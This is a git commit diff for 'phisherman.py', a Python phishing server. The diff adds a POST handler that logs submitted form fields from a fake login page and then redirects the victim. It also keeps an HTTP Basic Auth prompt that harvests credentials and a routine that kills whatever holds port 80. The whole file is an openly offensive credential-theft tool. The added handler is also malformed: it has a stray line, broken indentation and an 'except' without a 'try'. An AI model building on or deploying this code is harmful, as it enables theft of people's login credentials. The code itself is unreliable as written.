5460eb929a1157aa6d5da94046e9a0a0be7bc269
Nebula <43358273+nebula-cpp@users.noreply.github.com>
2020-03-10 20:20:16 -0700

    Update phisherman.py

--- phisherman.py
+++ phisherman.py
@@ -3,11 +3,27 @@ import SocketServer
 import socket
 import os
 import base64
+import cgi
 
 PORT = 80
 
+class MainHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
+	print("")
+	def do_POST(self):
+		str(tag).strip()
+			form = cgi.FieldStorage(self.rfile, headers=self.headers, environ={'REQUEST_METHOD':'POST', 'CONTENT_TYPE':self.headers['Content-Type'],})
+			print("##################################")
+			for tag in form.list:
+				print("POST REQUEST: " + (str(tag).strip())[16:])
+			print("##################################")
+			self.send_response(302)
+			self.send_header('Location', redirect)
+			self.end_headers()
+			print("Client redirected to " + redirect + "!")
+		except:
+			print("Error")
+
 class RequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
-	client = ""
 	def do_GET(self):
 		if str(self.headers).find('UserLogin=1') > 0:
 			self.send_response(302)
@@ -16,10 +32,9 @@ class RequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
 		else:
 			if str(self.headers).find('Authorization: Basic ') > 0:
 				self.send_response(302)
-				self.send_header('Set-Cookie', 'UserLogin=1')
+				#self.send_header('Set-Cookie', 'UserLogin=1')
 				self.send_header('Location', redirect)
 				credsArray = str(self.headers).split("\n")
-				#creds = credsArray[-2]
 				for i in credsArray:
 					if "Authorization:" in i:
 						credsArray = i.split(" ")
@@ -36,29 +51,40 @@ class RequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
 				self.send_header('WWW-Authenticate', 'Basic realm="'+ statement +'"')
 				self.end_headers()
 
-try:
-	from psutil import process_iter
-	from signal import SIGTERM
-	from signal import SIGKILL
-except:
-	print "Module \"psutil\" not installed. Installing...\n"
-	os.system("pip install psutil")
-	print("\n")
+def freePort():
+	#########################################################################
+	#os.system('sudo kill $(lsof -t -i :'+ str(PORT) +') > /dev/null 2>&1')
+	#########################################################################
+	#"""
 	try:
 		from psutil import process_iter
 		from signal import SIGTERM
 		from signal import SIGKILL
-		print("Module \"psutil\" installed successfully. Continuing...")
 	except:
-		print("Failed to install module \"psutil\". Continuing...")
-for proc in process_iter():
-	for conns in proc.connections(kind='inet'):
-		if conns.laddr.port == PORT:
-			proc.send_signal(SIGTERM)
-			proc.send_signal(SIGKILL)
+		print "Module \"psutil\" not installed. Installing...\n"
+		os.system("pip install psutil")
+		print("\n")
+		try:
+			from psutil import process_iter
+			from signal import SIGTERM
+			from signal import SIGKILL
+			print("Module \"psutil\" installed successfully. Continuing...")
+		except:
+			print("Failed to install module \"psutil\". Continuing...")
+	try:
+		for proc in process_iter():
+			for conns in proc.connections(kind='inet'):
+				if conns.laddr.port == PORT:
+					proc.send_signal(SIGTERM)
+					proc.send_signal(SIGKILL)
+	except:
+		print("Failed to close port " + PORT)
+	#"""
+	#########################################################################
 
-print """
- [1] - Normal phishing page
+freePort()
+
+print """ [1] - Normal phishing page
  
  [2] - HTTP Auth phishing page
 """
@@ -67,14 +93,14 @@ phishMode = input("Mode: ")
 if phishMode == 1:
 	serverDir = raw_input("Path to server folder: ")
 	serving = os.path.basename(os.path.normpath(serverDir))
-	Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
+	Handler = MainHandler
 	if serverDir != "":
 		os.chdir(serverDir)
 if phishMode == 2:
-	redirect = raw_input("Redirect URL: ")
 	statement = raw_input("Auth statement: ")
 	Handler = RequestHandler
 	serving = "HTTP Auth Phish"
+redirect = raw_input("Redirect URL: ")
 ##################################
 
 try:
@@ -84,6 +110,8 @@ try:
 except KeyboardInterrupt:
 	print("\nShutting down web server...")
 	httpd.shutdown()
+	freePort()
+	print("\nWeb server CLOSED...")
 except socket.error:
 	print("Error: Port " + str(PORT) + " in use! Closing...")
 	exit()
